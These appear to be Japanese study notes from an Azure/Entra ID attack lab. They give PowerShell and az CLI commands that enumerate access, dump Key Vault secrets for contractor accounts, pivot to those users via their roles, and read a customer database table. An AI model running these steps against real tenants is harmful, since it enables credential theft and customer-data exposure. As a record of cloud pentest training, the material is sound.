# 攻撃の概要
![[images/Pasted image 20260910231146.png]]

# EntraIDとサブスクリプションの関係
1つのEntraIDディレクトリに複数のAzureサブスクリプションが信頼関係を結べる
あるサブスクリプションから同ディレクトリの別サブスクリプションへ横展開可能

### Azure CLIの準備
Microsoft Graphより先に実行する必要
```powershell
Install-Module Az
Import-Module Az
Connect-AzAccount
```

### Microsoft Graphの準備
Microsoft Graphセッションの取得
Azure CLIより先に実行しないこと
```powershell
Install-Module Microsoft.Graph
Import-Module Microsoft.Graph.Users
Connect-MgGraph
```

### whoami
Microsoft Graph
```
Get-MgContext
```

Azure command
```
az ad signed-in-user show
```

### メンバーシップ列挙
ユーザのグループメンバーシップを取得
```powershell
Get-MgUserMemberOf -userid "marcus@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
```

### アクセス可能なリソース列挙
Directory Readersグループ所属の場合-> EntraIDを列挙可能
リソースのアクセス権を確認（Azure Key Vaultへのアクセス権が出てくる想定）
```powershell
$CurrentSubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"
$OutputFormat = "table"
& az account set --subscription $CurrentSubscriptionID
& az resource list -o $OutputFormat
```

GUI版
Azure ポータル (https://portal.azure.com/) を使用して、アクセスできるリソースを列挙することもできます。認証情報を使用してログインすると (  侵害された外部認証プロバイダー「mbt-eam」を使用して MFA を満たすと)、次のページが表示されます。
![[images/Pasted image 20260910221548.png]]
![[images/Pasted image 20260910221541.png]]

## Azure Key Vaultとは
Azure Key Vault は、シークレット、暗号化キー、証明書を安全に管理するための集中型クラウド サービスです。暗号化キーと機密情報に対する制御を強化し、不正アクセスのリスクを軽減します。

### アクセス可能なKey Vaultの中身列挙

```powershell
# Set variables
$VaultName = "ext-contractors"

# Set the current Azure subscription
$SubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"
az account set --subscription $SubscriptionID

# List and store the secrets
$secretsJson = az keyvault secret list --vault-name $VaultName -o json
$secrets = $secretsJson | ConvertFrom-Json

# List and store the keys
$keysJson = az keyvault key list --vault-name $VaultName -o json
$keys = $keysJson | ConvertFrom-Json

# Output the secrets
Write-Host "Secrets in vault $VaultName"
foreach ($secret in $secrets) {
    Write-Host $secret.id
}

# Output the keys
Write-Host "Keys in vault $VaultName"
foreach ($key in $keys) {
    Write-Host $key.id
}
```

例えば出力として契約社員のアカウントと思われるものが3件、Key Vaultに記録されている
```
https://ext-contractors.vault.azure.net/secrets/alissa-suarez
https://ext-contractors.vault.azure.net/secrets/josh-harvey
https://ext-contractors.vault.azure.net/secrets/ryan-garcia
```

中身のシークレットを取り出す
```powershell
# Set variables
$VaultName = "ext-contractors"
$SecretNames = @("alissa-suarez", "josh-harvey", "ryan-garcia")

# Set the current Azure subscription
$SubscriptionID = "ceff06cb-e29d-4486-a3ae-eaaec5689f94"
az account set --subscription $SubscriptionID

# Retrieve and output the secret values
Write-Host "Secret Values from vault $VaultName"
foreach ($SecretName in $SecretNames) {
    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
    $secretValue = ($secretValueJson | ConvertFrom-Json).value
    Write-Host "$SecretName - $secretValue"
}
```

### EntraIDのユーザ列挙
ユーザ列挙でKey Vaultに存在するものがでてきたら、そのユーザは利用可能ということになる
```powershell
az ad user list --query "[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table
```
### ユーザ深堀
見つけたEntraIDユーザのobjectIDを取得
```powershell
Get-MgUser -UserId ext.josh.harvey@megabigtech.com
```

objectIDを使用してユーザのグループメンバシップを確認
```powershell
$UserId = '6470f625-41ce-4233-a621-fad0aa0b7300'
Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
```

EntraIDの管理センター > Default Directory > All Groupsからグループを確認可能
![[images/Pasted image 20260910223446.png]]

さらにグループのobjectIDを列挙する
```powershell
Get-AzRoleAssignment -Scope "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94" | Select-Object DisplayName, RoleDefinitionName
```

## Azure Storage
Azureストレージはストレージアカウントがあり、そのアカウントごとにBlob Storage, Table Storage, Queue Storage, File Storageが存在する。

### ユーザの権限を確認
既存ユーザからログアウトする
```powershell
az logout
Disconnect-AzAccount
```

確認したいユーザで再ログイン
```powershell
az login
Connect-AzAccount
```

権限確認
```powershell
Get-AzRoleAssignment -Scope "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94" | Select-Object DisplayName, RoleDefinitionName
```

出力からロールがいくつか割り当てられてるのを確認したら
```
DisplayName              RoleDefinitionName
-----------              ------------------
Ian Austin               Key Vault Administrator
Marcus Hutch             Key Vault Reader
Marcus Hutch             Key Vault Secrets User
Josh Harvey (Consultant) Reader
CUSTOMER-DATABASE-ACCESS Customer Database Access
```

ロール確認
```powershell
az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" -o json
```

出力内容を確認するとテーブルの存在を確認し、データの中身を見ることが可能と判明
- `actions`: 管理面(control plane)の操作
	- 例えば「テーブルが存在するかどうかをリストできる」
	- `tableServices/tables/read`
- `dataActions`: データ面(data plane)の操作 
	- 実際のデータそのものへのアクセス
	- `tableServices/tables/entities/read`

ストレージアカウントの列挙(Readerロールにより列挙可能)
```powershell
az storage account list --query "[].name" -o tsv
```

3つのデータベースcustdatabase, mbtwebsite, securityconfigsが表示される
custdatabaseのテーブルを確認
```powershell
az storage table list --account-name custdatabase --output table --auth-mode login
```

customersテーブルの中身を確認すると顧客データベースの中身を取得できた
```powershell
az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login
```

